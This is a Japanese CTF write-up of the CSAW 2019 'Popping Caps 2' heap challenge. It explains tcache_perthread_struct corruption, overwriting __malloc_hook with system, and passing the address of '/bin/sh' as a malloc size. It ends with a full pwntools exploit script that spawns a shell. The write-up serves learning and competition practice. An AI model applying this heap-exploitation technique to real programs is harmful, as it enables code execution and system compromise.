---
tags: pwn
---

# CSAW CTF 2019 Quals - Poppong Caps 2

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/osirislab/CSAW-CTF-2019-Quals>

## Writeup

### Outline

[CSAW CTF 2019 Quals - Poppong Caps](/@Xornet/SyGkuSL0I)の亜種。2の癖に無印から強化された点はあんまりない
終了時のmallocが無くなったので実質回数制限は-1、よって無印と同じコードで攻撃は出来ない
その代わりにwrite時の書き込み制限が0x8から0xffまで大幅に緩和されたので`mchunk_size`を立てなくても`tcache_perthread_struct`をそのままfreeしてentriesをwriteできる。

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

動作フローは無印とだいたい同じ。差異もOutlineでだいたい述べた通り。
回数制限はそのまま7回でlibc leakも最初から済んでいる。終了時のmallocが無くなりwrite時に0xffも書き込める、嬉しい。

### `tcache_perthread_struct`をfreeする

無印同様確保したポインタ`p1`からの距離がわかればどこでもfree出来る。しかも`tcache_perthread_struct`は最初から`mchunk_size`メンバがあるので無印のようにカウンタでチャンクを偽装する必要も無い

### `tcache_perthread_struct`を書き換える

無印では確保した領域に8バイトしか書き込めなかったため`tcache_perthread_struct`を先頭から確保してもせいぜい小さいサイズのカウンタを書き換えるだけだったが今回は0xffバイト書き込めるのでカウンタ部分とある程度のサイズのentriesまで書き込みが出来る。
entriesの先頭はチャンクサイズにして0x20のチャンクのtcacheの先頭になるのでここに`__malloc_fook`のアドレスを設定すれば次の`malloc(0x18)`等で`__malloc_hook`を指すポインタが手に入るので好きなように書き換える。今回は`system`のアドレスを指定した。

### `malloc(size) with system("/bin/sh")`

地味に忘れがちだが、one gadgetがlibc中に存在しているということは`"/bin/sh"`もlibc中に存在している。ということはここのオフセットが判明すればlibcのアドレスを足すことで`"/bin/sh"`のアドレスも判明する。
したがって先程の`__malloc_hook`に`system`を書き込んだことで`malloc(size)`時に`system(size)`が走ることになる。
今回サイズに大きさ制限は無い上に指定できるのでこの`size`に`"/bin/sh"`のアドレスを仕込んでおけば`system("/bin/sh")`が実行される。

いつもだったらそんな面倒なことはしないのだがOne Gadgetが全部死んだ上に回数制限のせいで`__free_hook`経由で`system("/bin/sh")`を実行するのも無理なのでこうしました。

## Code

```python
from pwn import *


def select(s, sel, c=b"choice: "):
    s.recvuntil(c)
    s.sendline(str(sel))


def malloc(s, size):
    select(s, 1)
    s.recvuntil(b"How many: ")
    s.sendline(str(size))


def delete(s, idx=0):
    select(s, 2)
    s.recvuntil(b"free: ")
    s.sendline(str(idx))


def write(s, data):
    select(s, 3)
    s.recvuntil(b"in: ")
    s.send(data)


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - 1にあった最後のmallocが無い
        - 1と比べてwriteの文字制限が緩い -> tcache_perthread_entryを一気に書き換えられる
    """
    elf = ELF("./popping_caps_2")
    malloc_got = elf.got["malloc"]
    libc = ELF("./libc.so.6")
    arena_libc = 0x3ebc40
    system_libc = libc.symbols["system"]
    free_hook_libc = libc.symbols["__free_hook"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
    binsh = next(libc.search(b"/bin/sh"))
    print(hex(binsh))

    s = process("./popping_caps_2")
    s.recvuntil(b"system ")
    libc_addr = int(s.recvline().rstrip(), 16) - system_libc
    print(hex(libc_addr))
    malloc(s, 0x18)
    delete(s, -0x250)
    malloc(s, 0x248)

    payload = p64(0) * 8 + p64(malloc_hook_libc + libc_addr)

    write(s, payload)
    malloc(s, 0x18)
    # _ = input()

    write(s, p64(libc_addr + system_libc))

    malloc(s, str(libc_addr + binsh))

    s.interactive()

```

## Flag

毎度のごとくローカルでシェル取っただけです

## 感想

最強のExploitが出そう、だったのにOne Gadgetが全部外れたせいで発狂していた。
`free(p)`で`p`に`"/bin/sh"`を指させてhookを発火させるというのはよく使うが、`malloc(size)`で`size`にアドレスを仕込むのは今回が初めてだったので覚えておきたい。

しかしこの問題も無印も`tcache_perthread_struct`の勉強の為にたどり着いてWriteupを読んだから解けたのであって実戦で出たら`mchunk_size`の偽装に苦戦したりする気配しか無い。